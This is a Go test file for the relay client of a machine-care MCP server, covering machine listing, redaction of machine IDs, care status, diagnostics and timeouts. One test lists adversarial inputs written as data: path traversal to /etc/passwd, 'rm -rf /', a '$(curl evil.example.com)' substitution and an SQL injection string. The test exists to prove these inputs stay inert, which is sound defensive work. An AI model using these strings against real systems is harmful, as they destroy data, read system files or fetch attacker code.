package relay_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/commandoperator/cmdop-care-mcp/internal/carepb"
	"github.com/commandoperator/cmdop-care-mcp/internal/relay"
	"github.com/commandoperator/cmdop-care-mcp/internal/relay/testfake"
)

func dialFake(t *testing.T, fake *testfake.Server) *relay.Client {
	t.Helper()
	conn := testfake.Dial(t, fake)
	return relay.NewFromConn(conn, "test-token")
}

func TestListMachines_HappyPath(t *testing.T) {
	fake := &testfake.Server{
		Sessions: []*carepb.SessionInfo{
			{DisplayName: "web-01", Status: carepb.SessionStatus_SESSION_STATUS_ONLINE, Os: "linux", MachineId: "should-never-appear-in-output"},
			{DisplayName: "laptop", Status: carepb.SessionStatus_SESSION_STATUS_OFFLINE, Os: "macos", MachineId: "also-hidden"},
		},
	}
	client := dialFake(t, fake)

	list, err := client.ListMachines(context.Background())
	if err != nil {
		t.Fatalf("ListMachines: %v", err)
	}
	if len(list) != 2 {
		t.Fatalf("expected 2 machines, got %d", len(list))
	}
	for _, m := range list {
		if m.Host == "" {
			t.Errorf("machine missing Host: %+v", m)
		}
	}
}

func TestListMachines_DropsMachineID(t *testing.T) {
	// Regression for security-architecture-2026-07-18.md §5: the raw relay
	// machine UUID must never reach the serialized list_machines output.
	fake := &testfake.Server{
		Sessions: []*carepb.SessionInfo{
			{DisplayName: "web-01", Status: carepb.SessionStatus_SESSION_STATUS_ONLINE, Os: "linux", MachineId: "11111111-2222-3333-4444-555555555555"},
		},
	}
	client := dialFake(t, fake)

	list, err := client.ListMachines(context.Background())
	if err != nil {
		t.Fatalf("ListMachines: %v", err)
	}
	if len(list) != 1 {
		t.Fatalf("expected 1 machine, got %d", len(list))
	}
	// relay.Machine has no ID field at all — this is a compile-time guarantee,
	// but also assert the JSON serialization carries no UUID-shaped string.
	blob := marshalOrFail(t, list)
	if strings.Contains(blob, "11111111-2222-3333-4444-555555555555") {
		t.Fatalf("serialized list_machines output leaked the machine UUID: %s", blob)
	}
}

func TestCareStatus_MachineNotFound(t *testing.T) {
	fake := &testfake.Server{Care: map[string]*carepb.GetMachineCareResponse{}}
	client := dialFake(t, fake)

	_, err := client.CareStatus(context.Background(), "does-not-exist")
	if err == nil {
		t.Fatal("expected error for unknown machine, got nil")
	}
}

func TestCareStatus_NotReported(t *testing.T) {
	fake := &testfake.Server{Care: map[string]*carepb.GetMachineCareResponse{
		"web-01": {MachineId: "id-1", Reported: false},
	}}
	client := dialFake(t, fake)

	status, err := client.CareStatus(context.Background(), "web-01")
	if err != nil {
		t.Fatalf("CareStatus: %v", err)
	}
	if status.Findings == nil {
		t.Fatal("expected empty-but-non-nil Findings slice for an unreported machine")
	}
}

func TestCareDiagnose_ForwardsResolvedMachineID(t *testing.T) {
	fake := &testfake.Server{
		Care: map[string]*carepb.GetMachineCareResponse{
			"web-01": {MachineId: "resolved-id-1", Reported: true, Snapshot: &carepb.CareSnapshot{}},
		},
		Diagnostics: map[string]*carepb.RunMachineCareDiagnosticResponse{
			"resolved-id-1": {
				MachineId: "resolved-id-1",
				Diagnostic: &carepb.CareDiagnostic{
					ScanRunId: "scan-1",
					Processes: &carepb.CareProcessDiagnostic{
						Entries: []*carepb.CareProcessAttribution{{Pid: 4242, Name: "node"}},
					},
					Startup: &carepb.CareStartupDiagnostic{},
				},
			},
		},
	}
	client := dialFake(t, fake)

	diag, err := client.CareDiagnose(context.Background(), "web-01")
	if err != nil {
		t.Fatalf("CareDiagnose: %v", err)
	}
	if diag.ScanRunID != "scan-1" {
		t.Fatalf("expected scan-1, got %q", diag.ScanRunID)
	}
	if len(diag.Processes.Entries) != 1 || diag.Processes.Entries[0].PID != 4242 {
		t.Fatalf("expected disclosed PID 4242 in response, got %+v", diag.Processes.Entries)
	}
}

func TestCareDiagnose_AdversarialMachineArgsAreInertLookupKeys(t *testing.T) {
	// Security review §6: the only free-form input is the machine string,
	// used purely as a bounded lookup key — never interpolated into a path,
	// shell command, or query. Prove adversarial strings don't crash, hang,
	// or get special-cased by this client.
	adversarial := []string{
		"../../../etc/passwd",
		"; rm -rf / #",
		"$(curl evil.example.com)",
		"machine\x00withnull",
		strings.Repeat("a", 100_000),
		"日本語マシン名前😀",
		"' OR '1'='1",
		"",
	}
	fake := &testfake.Server{Care: map[string]*carepb.GetMachineCareResponse{}}
	client := dialFake(t, fake)

	for _, m := range adversarial {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		_, err := client.CareStatus(ctx, m)
		cancel()
		// Every one of these must fail cleanly as "unknown machine" (from the
		// fake's map miss) — never panic, never hang past the test's own
		// context deadline, never a different error class implying the string
		// was parsed/executed as anything but an opaque key.
		if err == nil {
			t.Errorf("adversarial machine arg %q unexpectedly succeeded", m)
		}
	}
}

func TestCareDiagnose_TimeoutCutsOffHangingBackend(t *testing.T) {
	fake := &testfake.Server{Hang: true}
	client := dialFake(t, fake)

	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()

	start := time.Now()
	_, err := client.CareStatus(ctx, "anything")
	elapsed := time.Since(start)

	if err == nil {
		t.Fatal("expected an error from a hanging backend under a short context timeout")
	}
	if elapsed > 2*time.Second {
		t.Fatalf("call was not cut off by the context timeout: took %s", elapsed)
	}
}

func marshalOrFail(t *testing.T, v any) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}
